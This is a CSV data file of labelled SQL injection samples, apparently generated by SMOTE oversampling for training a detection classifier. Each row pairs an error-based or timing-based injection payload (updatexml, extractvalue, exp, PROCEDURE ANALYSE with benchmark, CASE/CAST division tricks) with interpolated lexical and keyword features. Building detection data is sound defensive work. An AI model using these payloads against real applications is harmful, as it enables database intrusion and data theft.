id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000112,attack,error,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and 'cipk'  =  'cipk",nearest_attack_euclidean,R000070,0.3586776219721961,162.73547123413232,29.65290575317354,3.849195891132351,48.0,35.0,58.38837698730585,21.34709424682646,0.29511087068256325,0.21518500987270237,0.3585633226039991,0.13114079684073524,4.0,1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,10.347094246826462,0.0,0.0,5.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000113,attack,error,"1"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""ekjs"" like ""ekjs",nearest_attack_euclidean,R000240,1.298823727037623,161.4729958440539,30.418987532161694,3.9636685761242085,48.4729958440539,39.0,53.0,21.0,0.3001858956513339,0.24152876167785822,0.3282313940750381,0.1300539485957698,0.0,4.000000000000001,0.0,0.0,0.0,1.0,0.0,10.0,0.0,0.0,6.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.472995844053898,0.5270041559461022,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000114,attack,error,"1' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'qcsi'  =  'qcsi",nearest_attack_euclidean,R000115,0.06432851913556929,161.0,28.182083666624074,3.8782445702225736,45.0,39.0,55.0,22.0,0.2795031055900621,0.2422360248447205,0.3416149068322981,0.13664596273291926,4.0,1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,10.0,0.0,0.0,6.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000115,attack,error,"1  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  ",nearest_attack_euclidean,R000268,0.6381577539805365,142.92132209217075,25.26966947695731,3.6479611445214717,34.0,39.0,51.921322092170755,18.0,0.2379303099636009,0.27292006142883635,0.3631865233327152,0.12596310527484753,0.26966947695731114,1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,10.730330523042689,0.0,0.0,6.0,1.0,0.26966947695731125,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000116,attack,error,"1 where 7757  =  7757 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",nearest_attack_euclidean,R000307,0.9993732084207421,161.412689721939,30.41268972193899,3.8522937941246407,39.0,47.0,55.0,20.41268972193899,0.2416189364636293,0.29118179522539944,0.3407446539871695,0.12645461432380176,0.0,0.4126897219389903,2.0,0.0,0.0,2.0,0.0,10.0,0.0,0.0,6.0,4.0,0.0,0.4126897219389903,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000117,attack,error,"1 where 4968  =  4968 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",nearest_attack_euclidean,R000169,0.02761749429698393,160.0117342389136,30.0,3.853007164975145,38.0,47.0,55.0,20.011734238913583,0.23748269017551565,0.2937285904802431,0.34372494630666744,0.12506377303757382,0.0,0.011734238913581274,2.0,0.0,0.0,2.0,0.0,10.0,0.0,0.0,6.0,4.0,0.0,0.011734238913581108,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000118,attack,error,"1',  (  select   (  case when   (  5433  =  5433  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )  ",nearest_attack_euclidean,R000076,0.27425911026215977,141.0,28.77035339586542,3.5839295216905813,56.0,12.0,59.0,14.0,0.3971631205673759,0.08510638297872342,0.41843971631205673,0.09929078014184398,1.0,1.1102230246251565e-16,0.0,1.0,0.0,1.0,0.0,10.0,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0000000000000002,1.0000000000000002,7.0
SMOTE_000119,attack,error,"1""  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and   (  ""stcv""  =  ""stcv",nearest_attack_euclidean,R000219,1.6139616251384656,175.41014571095656,30.0,3.7621617756303554,61.64058284382618,24.0,67.1797085780869,22.589854289043455,0.3513796511367594,0.13682326308237153,0.383005165351304,0.12879192042956505,0.0,4.000000000000001,0.0,0.0,0.0,0.5898542890434539,0.0,14.0,0.0,0.0,4.0,0.5898542890434542,0.0,1.0,0.0,0.0,0.0,0.5898542890434539,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000120,attack,error,"1 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000056,0.27189565845785135,144.17755688057093,32.177556880570926,3.8512959509161573,50.0,23.0,54.0,17.177556880570926,0.34679995034110794,0.15952797715690964,0.3745439463683966,0.11912812613358578,0.0,0.08877844028546278,0.0,0.0,0.0,0.0,0.0,12.0,0.08877844028546289,0.0,4.0,0.0,0.0,0.08877844028546278,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000121,attack,error,"1%'   )    )     )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000012,1.15655538926098,188.59226130229038,27.0,3.4155467588848003,37.815477395419215,37.36904520916157,83.81547739541922,29.592261302290392,0.20052942585695957,0.19812144978448187,0.4444435308917069,0.15690559346685162,4.0,1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,16.0,1.9999999999999998,0.0,5.5922613022903915,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.5922613022903915,0.40773869770960836,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000122,attack,error,"1'   )    )    or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (   'gydh'  =  'gydh",nearest_attack_euclidean,R000141,0.010510170386740401,184.06114929751445,29.0,3.6357586822918146,44.0,39.0,75.04891943801155,26.012229859502888,0.23905506025631346,0.21188971249991417,0.40773237839759474,0.1413228488461776,4.0,1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,14.012229859502888,0.0,0.0,6.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000123,attack,error,"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'zenl' like 'zenl",nearest_attack_euclidean,R000034,1.2073324600448136,192.0,30.242978306012947,3.652284495584886,56.86446745901942,32.0,77.75702169398706,25.378510846993525,0.2961691013490595,0.16666666666666666,0.4049844879895159,0.13217974399475796,4.0,1.1102230246251565e-16,0.0,0.0,1.0,1.3785108469935263,0.0,14.0,0.0,0.0,4.0,2.3785108469935263,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,1.3785108469935263,0.6214891530064738,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000124,attack,error, (  select   (  case when   (  5603  =  5603  )   then 5603 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  ) ,nearest_attack_euclidean,R000149,0.6357491013107424,139.47303423039176,26.473034230391768,3.56458474741322,56.0,13.526965769608232,57.47303423039177,12.473034230391768,0.40152610251023324,0.09702667292974435,0.4120510641814442,0.08939616037857823,0.23651711519588403,1.1102230246251565e-16,0.0,1.0,0.0,1.0,0.0,10.0,0.0,0.0,0.23651711519588403,2.0,0.2365171151958841,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0000000000000002,1.0000000000000002,7.0
SMOTE_000125,attack,error,"1 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  # usus",nearest_attack_euclidean,R000261,0.03354065247064837,149.20109622351418,29.023658379236963,3.7667160675078035,53.10646270656633,24.0,55.07097513771089,17.023658379236963,0.35591513072823366,0.16087869696109242,0.36910790827305096,0.11409826403762297,0.011829189618481006,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,12.011829189618481,0.0,0.0,4.0,0.0,0.011829189618481117,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000126,attack,error,"1  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  ",nearest_attack_euclidean,R000028,0.7817131338221804,149.7860180332681,28.893009016634057,3.644470732872344,49.22325225415852,23.776747745841487,59.33951352495108,17.446504508317027,0.32872169308668236,0.15887449036668855,0.395991812013306,0.11641200453332304,0.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,13.223252254158513,0.0,0.0,4.0,0.0,0.0,0.0,0.0,0.2232522541585139,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000127,attack,error,"1""  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  ""mhfc""  =  ""mhfc",nearest_attack_euclidean,R000212,0.28726503042881996,170.14519649981554,28.854803500184463,3.7215709187446584,47.580785999262154,35.0,64.70960700036892,22.854803500184463,0.2796322457648172,0.20570753775392006,0.3803300797239321,0.1343301367573306,0.0,4.000000000000001,0.0,0.0,0.0,1.8548035001844616,0.0,12.0,0.0,0.0,5.0,1.8548035001844618,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000128,attack,error,"1'||  (  select 'rttq' from dual where 7368  =  7368 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'",nearest_attack_euclidean,R000006,0.022577613782371064,198.9642942005703,32.0,3.9595648493696687,56.053558699144546,46.92858840114061,68.0,27.982147100285154,0.2817299111266441,0.23586121634569235,0.34177047660539295,0.14063839592227065,4.0,1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,12.0,0.0,0.0,5.982147100285152,6.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000129,attack,error,"1'  )   as dajk where 1452  =  1452 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000197,0.844304913493686,173.9048639468387,36.976215986709676,3.97391215329281,58.25405328903224,31.0,64.32540532890323,20.325405328903223,0.3344674060135538,0.178440504772075,0.3701812415422066,0.11691084767216466,1.0,1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,13.0,0.0,0.0,4.0,1.3254053289032246,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.3254053289032245,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.3254053289032246
SMOTE_000130,attack,error,"1' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'qcsi'  =  'qcsi",nearest_attack_euclidean,R000115,0.8771126436472398,165.6233431078338,28.53766568921662,3.8309979400310468,45.0,39.0,58.698674486267045,22.92466862156676,0.2719461537956296,0.23568666662287902,0.3540083077751674,0.13835887180632395,4.0,1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,10.924668621566761,0.0,0.0,6.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000131,attack,error,"1%"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and ""%""  =  """,nearest_attack_euclidean,R000092,1.3778216706564308,161.2931364723317,31.0,3.8175285655384728,55.057515296442276,24.0,60.0,22.23562117588943,0.3410292294862997,0.14884561557705503,0.3721140389426376,0.13801111599400762,0.0,4.000000000000001,0.0,0.0,0.0,1.0,0.0,12.0,1.2356211758894313,0.0,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000132,attack,error,"1'  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and   (  'szib' like 'szib",nearest_attack_euclidean,R000072,0.7468848136877002,171.9855308107277,31.0,3.8817709215440104,64.0,24.0,62.788424648582165,21.19710616214554,0.3724303815756239,0.13966139309085895,0.3647219915334896,0.12318623380002758,4.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,13.197106162145541,0.0,0.0,4.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000133,attack,error,"1'+  (  select 'otqy' where 2754  =  2754 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   +'",nearest_attack_euclidean,R000113,0.2702674439970353,187.10684565042368,32.89315434957633,3.92371312267291,48.10684565042367,47.0,66.0,26.0,0.25710693894097425,0.25119405661708066,0.3527405901431346,0.1389584142988106,4.0,1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,12.0,0.0,0.0,6.0,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.0,0.0,1.0,0.0,0.10684565042366889,0.893154349576331,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000134,attack,error,"1"" where 5334  =  5334 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R000040,1.1553630443939062,192.46226216160792,33.0,3.698359964189451,48.462262161607924,40.0,79.0,25.0,0.25179635555028984,0.20783434568047504,0.4104728327189382,0.1298964660502969,0.0,1.0,2.0,0.0,1.0,2.0,0.0,14.0,0.0,0.0,4.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,1.0,1.0,0.4622621616079222,0.5377378383920779,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000135,attack,error,"1' in boolean mode  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  #",nearest_attack_euclidean,R000065,0.12344247625231154,161.0,29.08362163845509,3.8196530027070645,46.25086491536527,38.665513446179645,56.16724327691018,19.91637836154491,0.2872724528904675,0.24015846860981147,0.34886486507397624,0.1237042134257448,1.0,1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,11.0,0.0,0.0,5.916378361544911,1.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000136,attack,error,"1'   )    )     )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000101,0.20517148251814105,162.12588080738735,33.125880807387354,3.6714439703865134,50.0,23.0,68.0,21.125880807387354,0.3084036188605102,0.1418656646758347,0.41942892165029383,0.13030179481336124,1.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,15.0,0.1258808073873534,0.0,4.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000137,attack,error,"1%'  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  '%'  =  '",nearest_attack_euclidean,R000051,1.1050092040369723,160.15089514601735,27.515089514601733,3.716037937787725,38.5452685438052,36.93964194159307,60.15089514601734,24.515089514601733,0.24062301090467897,0.23127114722393932,0.3749790621545155,0.1531267797168662,4.0,1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,11.030179029203467,1.9999999999999998,0.0,5.484910485398267,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000138,attack,error,"1'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  'beju' like 'beju",nearest_attack_euclidean,R000044,0.3952481206831379,169.2446023613879,29.521255189469425,3.8366226513811506,47.36167358595923,39.0,60.04251037893885,22.84041839648981,0.27979185927823136,0.23057238698486374,0.35465455156264186,0.134981202174263,4.0,1.1102230246251565e-16,0.0,0.0,0.0,1.1595816035101918,0.0,11.680836792979617,0.0,0.0,6.0,1.1595816035101918,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000139,attack,error,"1'   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'tblb'  =  'tblb",nearest_attack_euclidean,R000078,0.13342818335371434,184.63252284582805,27.115004153786916,3.527873121598551,47.23000830757383,35.0,77.34501246136075,25.057502076893456,0.2557857568238481,0.18960038183935393,0.4188901347202235,0.13572372661657456,4.0,1.1102230246251565e-16,0.0,0.0,0.0,1.9424979231065418,0.0,14.115004153786916,0.0,0.0,5.0,1.9424979231065416,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
